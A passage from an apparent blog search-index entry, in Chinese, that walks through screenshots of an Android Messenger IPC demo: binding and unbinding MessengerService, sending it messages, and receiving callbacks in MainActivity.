<p>点击bind,启动messengerservice<img src="https://gitee.com/oxchang/img-host/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229104450082.png" alt="image-20211229104450082"></p>
<p>点击message向MessengerService发送消息，messengerservice收到消息后弹出显示框<img src="https://gitee.com/oxchang/img-host/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229104520678.png" alt="image-20211229104520678"></p>
<p>点击callback，messengerservice收到消息后会构造一个信息返回给mainactivity<img src="https://gitee.com/oxchang/img-host/raw/master/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/image-20211229104539221.png" alt="image-20211229104539221"></p>
<p>点击unbind停止messengerservice服务，messengerservice服务停止之后点击message，callback，均不会有反应</p>
]]></content>
      <tags>
        <tag>进程</tag>
        <tag>Messenger</tag>
      </tags>
  </entry>
</search>
